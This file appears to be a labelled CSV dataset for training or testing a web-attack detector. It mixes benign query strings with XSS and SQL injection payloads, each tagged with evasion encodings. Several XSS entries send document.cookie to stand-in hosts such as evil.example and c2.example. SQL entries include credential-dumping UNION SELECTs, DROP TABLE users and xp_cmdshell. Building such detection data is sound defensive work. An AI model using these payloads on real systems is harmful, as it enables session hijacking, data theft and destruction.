payload,label,techniques
color=dashboard&user_id=1495,benign,
&lt;img src=x onerror=this.src=\u0027http://evil.example/'+document.cookie>,xss,unicode_substitution+comment_insertion
limit=7556,benign,
size=m&lang=id&search=laptop,benign,
page=6451&name=citra&lang=id,benign,
session=55d71c6,benign,
%3Cscript%3Efetch%28%27http%3A%2F%2Fc2.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,xss,comment_insertion+fallback_full_url_encode
page=8973,benign,
user_id=1531&price_max=2763&city=jakarta,benign,
price_min=8314,benign,
price_max=3258&id=3612&city=laptop,benign,
1%0aOr%091=1,sqli,case_toggle+unicode_substitution+whitespace
%252527%252520OR%252520SLEEP%2525288%252529%25253D%2525270,sqli,url_encode+double_url_encode+whitespace
email=orders@example.com&coupon=laptop&category=echo,benign,
%253Cscript%253Efetch%2528%2527http%253A%252F%2Fevil.example%2Fsteal%253Fc%3D%2527%252Bdocument.cookie%2529%253C%2Fscript%3E,xss,partial_url_encode+url_encode
%253Csvg%2520onload%253Dalert%25281%2529%253E,xss,comment_insertion+double_url_encode
view=grid&city=surakarta&theme=dark,benign,
"%3Ca%20href=""javascript%3Aalert(1%29%22>click<%2Fa>",xss,partial_url_encode
format=json&price_max=5665&sort=desc,benign,
city=foxtrot&color=camera,benign,
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,xss,double_url_encode+whitespace
q=delta,benign,
<script>new%20Image%28).src='http://evil.example/?c='%2Bdocument.cookie%3B%3C%2Fscript>,xss,partial_url_encode+whitespace
city=shoes&limit=526&size=m,benign,
%253Csvg%20onload%253Dalert%281%29%3E,xss,partial_url_encode+comment_insertion+url_encode
%27%20OR%201%3D1%20--,sqli,url_encode+comment_insertion
<img	src=x%0aonerror=this.src='http://evil.example/'+document.cookie>,xss,whitespace
page=2882&coupon=citra&city=budget,benign,
%27%3E%3Cscript%3Ealert(1)</script>,xss,whitespace+case_toggle+partial_url_encode
%22%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20--,sqli,url_encode
session=558d929&lang=id&category=foxtrot,benign,
&%2360%3Bscript%3Ealert%5Cu0028document.cookie%29&lt;%2Fscript%3E,xss,unicode_substitution+partial_url_encode
%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,xss,whitespace+fallback_full_url_encode
1%252520OR%2525201%25253D1,sqli,comment_insertion+double_url_encode+url_encode
session=520f8e5,benign,
session=1def43e&color=phone&currency=usd,benign,
"1;/**/exec
xp_cmdshell('dir')
--",sqli,case_toggle+whitespace
email=foxtrot@example.com,benign,
limit=9425,benign,
session=1de42ed&limit=7904&price_max=5583,benign,
'	OR%09'a'='a,sqli,whitespace
price_min=437&user_id=4351,benign,
&#60;style%3E@import %27http://evil.example/xss.css%27;&lt;/style>,xss,case_toggle+unicode_substitution+comment_insertion
session=3521f30,benign,
%252527%25252529%25252520OR%25252520%252528%252525271%252527%25253D%2525271,sqli,partial_url_encode+url_encode+double_url_encode
session=391974f&sort=asc,benign,
session=4ef7eb7&redirect=/home,benign,
user_id=1261,benign,
q=orders&sort=desc,benign,
%25253Cdetails%2520open%252520ontoggle%25253Dalert%25281%252529%253E,xss,partial_url_encode+double_url_encode
qty=2763&session=5b90675,benign,
id=576,benign,
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,xss,double_url_encode
admin%27%20--,sqli,partial_url_encode+whitespace+unicode_substitution
%252527%252520OR%2520SLEEP%2525287%2529%253D%25270,sqli,partial_url_encode+double_url_encode+unicode_substitution
%2527%252520OR%252520%25271%2527%253D%25271,sqli,double_url_encode+partial_url_encode+unicode_substitution
color=foxtrot&view=grid&format=json,benign,
city=budi&id=150,benign,
%3Cmarquee onstart=alert%281\u0029%3E,xss,unicode_substitution
offset=4912&session=2919ab6,benign,
sort=asc&price_min=6358&view=grid,benign,
limit=9336&ref=orders,benign,
sort=desc&search=settings&color=budi,benign,
%27%20UnIoN%20sELECT%20username%2C%20password%20frOm%20users%20--,sqli,case_toggle+url_encode
category=phone,benign,
%25253Cscript%25253Ealert%252528%252527xss%252527%252529%25253C%25252Fscript%25253E,xss,url_encode+double_url_encode+unicode_substitution
%27 AND %28SELECT%20COUNT%28%2A%29 FROM users) &gt; 0 --,sqli,partial_url_encode+unicode_substitution
%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,xss,comment_insertion+fallback_full_url_encode
lang=en&coupon=settings&price_max=6690,benign,
price_max=7106,benign,
email=budi@example.com&session=d7ca65&format=json,benign,
qty=8815,benign,
"<input/**/onfocus=alert(1)
autofocus>",xss,whitespace
%2527%20Or%20SLEEP%252810%29%3D%25270,sqli,case_toggle+partial_url_encode+url_encode
page=4263,benign,
%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E,xss,case_toggle+fallback_full_url_encode
<iframe	src=javascript:alert(1)>,xss,whitespace+comment_insertion
"&lt;img
src=x/**/onerror=this.src=%27http://bad-host.example/\u0027+document.cookie&gt;",xss,unicode_substitution+whitespace+case_toggle
currency=usd&price_min=945&id=7479,benign,
size=m&lang=id,benign,
ref=profile&email=report@example.com&q=book,benign,
%27%20UnIOn%20seLeCt%20username%2C%20password%20FroM%20users%20--,sqli,case_toggle+url_encode
category=alice&id=6542,benign,
id=528&price_min=5411&tab=foxtrot,benign,
%252527%253B%252520DROP%252520TABLE%2520users%25253B%2520--,sqli,partial_url_encode+case_toggle+double_url_encode
session=59b3e8e&tab=profile,benign,
qty=8729&token=4c6322d&offset=3288,benign,
theme=dark&format=json,benign,
%27%20OR%201%3D1%20--,sqli,url_encode+case_toggle
%2527%2520OR%2520%2527a%2527%253D%2527a,sqli,double_url_encode+comment_insertion
"""%20OR%09%221%22=""1",sqli,partial_url_encode+whitespace
view=grid,benign,
token=1db6259&offset=4985,benign,
%27%20OR%20%271\u0027%3D\u00271,sqli,partial_url_encode+unicode_substitution
offset=5310,benign,
"&#39;;
DrOp	tabLe	users;
--",sqli,case_toggle+unicode_substitution+whitespace
%3Ca%20href%3D%2522javascript%253Aalert%25281%2529%22%253Eclick%3C%2Fa%3E,xss,url_encode+partial_url_encode+unicode_substitution
page=1466&coupon=shoes&redirect=/home,benign,
%27 OR SLEEP%285%29=&#39;0,sqli,unicode_substitution
1%27 AND SLEEP\u00283%29 --,sqli,unicode_substitution
%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,xss,case_toggle+fallback_full_url_encode
%252527%252F%252A%252A%252FOR%252509%252527a%255Cu0027%253D%2527a,sqli,unicode_substitution+whitespace+double_url_encode
format=json&lang=en,benign,
1'	AND%091=1%0A--,sqli,whitespace+partial_url_encode
%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
limit=1220&format=json&session=d1abd9,benign,
